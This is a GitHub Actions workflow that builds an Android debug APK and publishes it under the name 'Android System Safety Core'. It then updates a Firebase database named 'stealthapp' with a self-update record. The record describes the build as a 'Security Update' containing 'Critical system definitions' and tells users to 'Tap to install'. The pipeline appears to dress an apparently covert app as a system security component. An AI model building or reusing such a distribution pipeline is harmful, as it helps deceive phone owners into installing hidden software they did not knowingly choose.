name: Build & Publish Release Update

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      version_name:
        description: 'Version Name (e.g. 3.13, leave empty for auto-increment)'
        required: false
        default: ''
      version_code:
        description: 'Version Code (leave empty for auto-increment)'
        required: false
        default: ''
      release_title:
        description: 'Release Title'
        required: false
        default: 'System Security Update'
      release_notes:
        description: 'Release Notes'
        required: false
        default: 'Automated build with security patches and performance improvements.'

permissions:
  contents: write

jobs:
  build-and-release:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'
          cache: 'gradle'

      - name: Grant execute permission for gradlew
        run: chmod +x gradlew

      - name: Determine Version Details
        id: versioning
        run: |
          FB_DATA=$(curl -s "https://stealthapp-50da2-default-rtdb.firebaseio.com/app_update.json")
          echo "Current Firebase Production Data: $FB_DATA"

          FB_VC=$(echo "$FB_DATA" | grep -o '"version_code":[0-9]*' | head -n1 | cut -d: -f2)
          FB_VN=$(echo "$FB_DATA" | grep -o '"version_name":"[^"]*"' | head -n1 | cut -d'"' -f4)

          GRADLE_VC=$(grep -m1 'versionCode' app/build.gradle | tr -cd '0-9')
          GRADLE_VN=$(grep -m1 'versionName' app/build.gradle | cut -d '"' -f 2)

          if [[ "${{ github.ref }}" == refs/tags/v* ]]; then
            RAW_TAG="${{ github.ref_name }}"
            VER_NAME="${RAW_TAG#v}"
            VC=$GRADLE_VC
            [ -z "$VC" ] && VC=16
            TAG_NAME=$RAW_TAG
          else
            # Workflow dispatch
            INPUT_VN="${{ github.event.inputs.version_name }}"
            INPUT_VC="${{ github.event.inputs.version_code }}"

            if [ -n "$INPUT_VC" ] && [ "$INPUT_VC" != "2" ]; then
              VC=$INPUT_VC
            else
              BASE_VC=$((FB_VC > GRADLE_VC ? FB_VC : GRADLE_VC))
              VC=$((BASE_VC + 1))
            fi

            if [ -n "$INPUT_VN" ] && [ "$INPUT_VN" != "1.1" ]; then
              VER_NAME=$INPUT_VN
            else
              BASE_VN="${FB_VN:-$GRADLE_VN}"
              if [[ "$BASE_VN" =~ ^([0-9]+)\.([0-9]+)$ ]]; then
                VER_NAME="${BASH_REMATCH[1]}.$((BASH_REMATCH[2] + 1))"
              else
                VER_NAME="3.13"
              fi
            fi
            TAG_NAME="v${VER_NAME}"
          fi

          echo "==> Production Version Code: $VC"
          echo "==> Production Version Name: $VER_NAME"
          echo "==> Production Tag: $TAG_NAME"

          echo "version_name=$VER_NAME" >> $GITHUB_OUTPUT
          echo "version_code=$VC" >> $GITHUB_OUTPUT
          echo "release_tag=$TAG_NAME" >> $GITHUB_OUTPUT

      - name: Update Version in build.gradle
        run: |
          sed -i "s/versionCode [0-9]*/versionCode ${{ steps.versioning.outputs.version_code }}/" app/build.gradle
          sed -i 's/versionName "[^"]*"/versionName "${{ steps.versioning.outputs.version_name }}"/' app/build.gradle
          echo "Updated app/build.gradle to versionCode ${{ steps.versioning.outputs.version_code }} and versionName ${{ steps.versioning.outputs.version_name }}"

      - name: Build APK with Gradle
        run: ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Prepare APK Asset
        run: |
          mkdir -p dist
          cp app/build/outputs/apk/debug/app-debug.apk dist/AndroidSystemSafetyCore.apk
          ls -lh dist/AndroidSystemSafetyCore.apk

      - name: Publish GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.versioning.outputs.release_tag }}
          name: "Android System Safety Core ${{ steps.versioning.outputs.release_tag }}"
          body: |
            ## Android System Safety Core Update
            - **Version Name:** ${{ steps.versioning.outputs.version_name }}
            - **Version Code:** ${{ steps.versioning.outputs.version_code }}
            - **Release Tag:** ${{ steps.versioning.outputs.release_tag }}

            ### Release Notes:
            ${{ github.event.inputs.release_notes || 'Automated build and continuous delivery update.' }}
          files: dist/AndroidSystemSafetyCore.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Update Firebase Realtime Database
        run: |
          APK_DOWNLOAD_URL="https://github.com/${{ github.repository }}/releases/download/${{ steps.versioning.outputs.release_tag }}/AndroidSystemSafetyCore.apk"
          echo "Updating Firebase Realtime Database with APK URL: $APK_DOWNLOAD_URL"
          
          curl -s -X PATCH "https://stealthapp-50da2-default-rtdb.firebaseio.com/app_update.json" \
            -H "Content-Type: application/json" \
            -d "{
              \"version_code\": ${{ steps.versioning.outputs.version_code }},
              \"version_name\": \"${{ steps.versioning.outputs.version_name }}\",
              \"min_version_code\": 1,
              \"force_update\": false,
              \"apk_url\": \"$APK_DOWNLOAD_URL\",
              \"title\": \"Security Update v${{ steps.versioning.outputs.version_name }}\",
              \"message\": \"Critical system definitions and security core v${{ steps.versioning.outputs.version_name }} is available. Tap to install.\"
            }"
          
          echo "Firebase Realtime Database successfully updated!"
